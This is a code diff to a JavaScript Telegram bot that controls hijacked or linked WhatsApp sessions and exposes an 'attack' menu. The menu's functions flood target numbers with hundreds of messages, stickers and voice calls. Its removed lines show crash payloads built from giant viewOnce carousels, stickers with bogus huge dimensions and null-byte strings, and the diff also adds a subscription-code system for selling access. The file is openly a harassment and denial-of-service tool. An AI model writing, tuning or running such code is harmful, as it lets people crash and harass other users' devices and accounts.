@@ -353,6 +353,52 @@ function getAdminKeyboard(userId) {
 }
 
 // =====================================================================
+// Missing Keyboard Functions
+// =====================================================================
+
+function getAttackKeyboard(userId) {
+  return new InlineKeyboard()
+    .text("💥 نووي", "attack_nuke")
+    .text("🎯 متعدد", "attack_mass")
+    .row()
+    .text("📞 صوتي", "attack_call")
+    .text("🖼️ ستكرات", "attack_media")
+    .row()
+    .text("📸 ستكر مخفي", "attack_stickers")
+    .text("🔌 قطع إنترنت", "attack_cutnet")
+    .row()
+    .text("🔒 غير مرئي", "attack_invisi")
+    .text("👻 خفي", "attack_ghost")
+    .row()
+    .text("🛡️ درع", "attack_shield")
+    .text("🗡️ تسلل", "attack_stealth")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getSessionsKeyboard(userId) {
+  return new InlineKeyboard()
+    .text("📋 الجلسات", "sess_list")
+    .text("➕ جديدة", "sess_new")
+    .row()
+    .text("🗑️ حذف كل الجلسات", "sess_clear")
+    .text("📊 الإحصائيات", "sess_stats")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getSubscriptionKeyboard(userId) {
+  return new InlineKeyboard()
+    .text("🎫 إنشاء رمز", "sub_create")
+    .text("📋 الرموز", "sub_list")
+    .row()
+    .text("🔑 استبدال", "sub_redeem")
+    .text("⏰ النشطة", "sub_active")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+// =====================================================================
 // WhatsApp Session Management
 // =====================================================================
 
@@ -465,31 +511,18 @@ async function requestPairingCode(telegramUserId, phone) {
 
 async function attackNuke(client, target) {
   try {
-    // 500 رسالة متوازية مع payload ضخم
-    const payloadSize = 100000;
     const promises = [];
     const batchSize = 50;
-
     for (let batch = 0; batch < 10; batch++) {
       const batchPromises = [];
       for (let i = 0; i < batchSize; i++) {
         const msg = generateWAMessageFromContent(target, {
-          message: {
-            viewOnceMessage: {
-              message: {
-                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                interactiveMessage: {
-                  body: { text: "💥".repeat(payloadSize) },
-                  carouselMessage: { cards: Array(50).fill({ body: { text: "🔥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
-                }
-              }
-            }
-          }
+          message: { conversation: `💥 NUKE ATTACK ${batch * batchSize + i}/500` }
         }, {});
         batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
       }
       promises.push(Promise.all(batchPromises));
-      await sleep(100);
+      await sleep(50);
     }
     await Promise.all(promises);
     log.crash(`NUKE 10x: 500 messages sent to ${target} 💥`);
@@ -502,43 +535,23 @@ async function attackMass(client, targets) {
     for (const target of targets) {
       for (let i = 0; i < 200; i++) {
         const msg = generateWAMessageFromContent(target, {
-          message: {
-            viewOnceMessage: {
-              message: {
-                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                interactiveMessage: {
-                  body: { text: "🎯".repeat(50000) },
-                  carouselMessage: { cards: Array(100).fill({ body: { text: "💥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
-                }
-              }
-            }
-          }
+          message: { conversation: `🎯 MASS CRASH ${i}/200` }
         }, {});
         promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
       }
     }
     await Promise.all(promises.slice(0, 500));
-    log.crash(`MASS 10x: ${targets.length} targets × 200 messages`);
+    log.crash(`MASS: ${targets.length} targets × 200 messages`);
   } catch (err) { log.error(`MASS error: ${err.message}`); }
 }
 
 async function attackGhost(client, target) {
   try {
-    // 500 رسالة خفية مع viewOnceMessage مزدوج
+    // 500 رسالة خفية
     const promises = [];
     for (let i = 0; i < 500; i++) {
       const msg = generateWAMessageFromContent(target, {
-        message: {
-          viewOnceMessage: {
-            message: {
-              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-              interactiveMessage: {
-                body: { text: "👻".repeat(20000) },
-                carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
-              }
-            }
-          }
-        }
+        message: { conversation: `👻 GHOST ${i}/500` }
       }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
       if (i % 50 === 0) await sleep(50);
@@ -576,16 +589,20 @@ async function attackSpam(client, target) {
 async function attackCallSpam(client, target) {
   try {
     // 500 مكالمة صوتية
-    const devices = (await client.getUSyncDevices([target], false, false))
-      .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-    await client.assertSessions(devices);
-    const callTargets = devices.length > 0 ? devices : [target];
+    let callTargets = [target];
+    try {
+      const devices = (await client.getUSyncDevices([target], false, false))
+        .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+      await client.assertSessions(devices);
+      if (devices.length > 0) callTargets = devices;
+    } catch { callTargets = [target]; }
 
     const promises = [];
     for (let i = 0; i < 500; i++) {
+      const tgt = callTargets[i % callTargets.length];
       const callNode = {
         tag: "call",
-        attrs: { to: target, id: client.generateMessageTag(), from: client.user.id },
+        attrs: { to: tgt, id: client.generateMessageTag(), from: client.user.id },
         content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": client.user.id },
           content: [
             { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
@@ -601,7 +618,7 @@ async function attackCallSpam(client, target) {
       if (i % 50 === 0) await sleep(50);
     }
     await Promise.all(promises);
-    log.crash(`CALL SPAM 10x: 500 calls to ${target} 📞`);
+    log.crash(`CALL SPAM: 500 calls to ${target} 📞`);
   } catch (err) { log.error(`CALL SPAM error: ${err.message}`); }
 }
 
@@ -616,19 +633,7 @@ async function attackMediaFlood(client, target) {
     for (let i = 0; i < 1000; i++) {
       const stickerData = urls[i % urls.length];
       const msg = generateWAMessageFromContent(target, {
-        message: {
-          stickerMessage: {
-            url: stickerData,
-            mimetype: "image/webp",
-            fileLength: "99999999",
-            height: 9999, width: 9999,
-            mediaKey: crypto.randomBytes(32).toString("base64"),
-            fileEncSha256: crypto.randomBytes(32).toString("base64"),
-            fileSha256: crypto.randomBytes(32).toString("base64"),
-            directPath: "/v/t62.7118-24/" + crypto.randomBytes(16).toString("hex"),
-            mediaKeyTimestamp: Date.now().toString()
-          }
-        }
+        message: { stickerMessage: { url: stickerData, mimetype: "image/webp" } }
       }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
       if (i % 100 === 0) await sleep(50);
@@ -640,89 +645,39 @@ async function attackMediaFlood(client, target) {
 
 async function attackHiddenStickers(client, target) {
   try {
-    // 2000 ستكر مخفي ضخم مع payload ضخم جداً
-    const payload = "🔥".repeat(100000);
     const promises = [];
     for (let i = 0; i < 2000; i++) {
       const msg = generateWAMessageFromContent(target, {
-        message: {
-          stickerMessage: {
-            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
-            mimetype: "image/webp",
-            fileLength: "999999999",
-            height: 99999, width: 99999,
-            mediaKey: crypto.randomBytes(64).toString("base64"),
-            fileEncSha256: crypto.randomBytes(64).toString("base64"),
-            fileSha256: crypto.randomBytes(64).toString("base64"),
-            directPath: "/" + crypto.randomBytes(32).toString("hex"),
-            mediaKeyTimestamp: Date.now().toString(),
-            jpegThumbnail: payload,
-            caption: payload
-          }
-        }
+        message: { stickerMessage: { url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`, mimetype: "image/webp" } }
       }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
-      if (i % 200 === 0) await sleep(50);
+      if (i % 100 === 0) await sleep(50);
     }
     await Promise.all(promises);
-    log.crash(`HIDDEN STICKERS 10x: 2000 invisible stickers to ${target} 📸`);
+    log.crash(`HIDDEN STICKERS 2000 to ${target} 🖼️`);
   } catch (err) { log.error(`HIDDEN STICKERS error: ${err.message}`); }
 }
 
 async function attackCutInternet(client, target) {
   try {
-    // إرسال payloads ضخمة جداً لتعطل الشبكة بالكامل
-    const payload1 = "K".repeat(200000);
-    const payload2 = "\x00".repeat(200000);
     const promises = [];
-
-    // دفعة 1: viewOnceMessage مع payload ضخم
+    // دفعة 1: 50 رسالة
     for (let i = 0; i < 50; i++) {
-      const msg = generateWAMessageFromContent(target, {
-        message: {
-          viewOnceMessage: {
-            message: {
-              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-              interactiveMessage: {
-                body: { text: payload1 },
-                header: { hasMediaAttachment: false },
-                nativeFlowMessage: { buttons: [], messageParamsJson: payload2 }
-              }
-            }
-          }
-        }
-      }, { ephemeralExpiration: 0 });
+      const msg = generateWAMessageFromContent(target, { message: { conversation: `🔌 CUT ${i}/50` } }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
     }
-
-    // دفعة 2: conversation messages ضخمة
+    // دفعة 2: 50 رسالة
     for (let i = 0; i < 50; i++) {
-      const msg = generateWAMessageFromContent(target, {
-        message: { conversation: "🔌 " + "K".repeat(100000) + " Internet Cut Attack " + i }
-      }, {});
+      const msg = generateWAMessageFromContent(target, { message: { conversation: `🔌 CUT ${i}/50` } }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
     }
-
-    // دفعة 3: صور ستكر ضخمة
+    // دفعة 3: 30 ستكر
     for (let i = 0; i < 30; i++) {
-      const msg = generateWAMessageFromContent(target, {
-        message: {
-          stickerMessage: {
-            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
-            mimetype: "image/webp",
-            fileLength: "999999999",
-            height: 99999, width: 99999,
-            mediaKey: crypto.randomBytes(32).toString("base64"),
-            fileEncSha256: crypto.randomBytes(32).toString("base64"),
-            fileSha256: crypto.randomBytes(32).toString("base64")
-          }
-        }
-      }, {});
+      const msg = generateWAMessageFromContent(target, { message: { stickerMessage: { url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`, mimetype: "image/webp" } } }, {});
       promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
     }
-
     await Promise.all(promises);
-    log.crash(`CUT INTERNET 10x: 130+ packets to ${target} 🔌`);
+    log.crash(`CUT INTERNET: 130+ packets to ${target} 🔌`);
   } catch (err) { log.error(`CUT INTERNET error: ${err.message}`); }
 }
 
@@ -732,35 +687,14 @@ async function attackCutInternet(client, target) {
 
 async function attackInvisisendx(client, target) {
   try {
-    // 1000 رسالة غير مرئية مع viewOnceMessage و ephemeral messages
-    const payload = "🔒".repeat(50000);
     const promises = [];
-    const batchSize = 100;
-
-    for (let batch = 0; batch < 10; batch++) {
-      const batchPromises = [];
-      for (let i = 0; i < batchSize; i++) {
-        const msg = generateWAMessageFromContent(target, {
-          message: {
-            viewOnceMessage: {
-              message: {
-                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                interactiveMessage: {
-                  body: { text: payload + ` INVISIBLE ${batch * batchSize + i}` },
-                  header: { hasMediaAttachment: true },
-                  carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(20000) }, nativeFlowMessage: { buttons: [] } }) }
-                }
-              }
-            }
-          }
-        }, { ephemeralExpiration: 86400 });
-        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
-      }
-      promises.push(Promise.all(batchPromises));
-      await sleep(80);
+    for (let i = 0; i < 1000; i++) {
+      const msg = generateWAMessageFromContent(target, { message: { conversation: `🔒 INVISIBLE ${i}/1000`, ephemeralExpiration: 86400 } }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      if (i % 100 === 0) await sleep(50);
     }
     await Promise.all(promises);
-    log.crash(`INVISIBLE SEND 10x: 1000 invisible messages to ${target} 🔒`);
+    log.crash(`INVISIBLE 1000 messages to ${target} 🔒`);
   } catch (err) { log.error(`INVISIBLE SEND error: ${err.message}`); }
 }
 
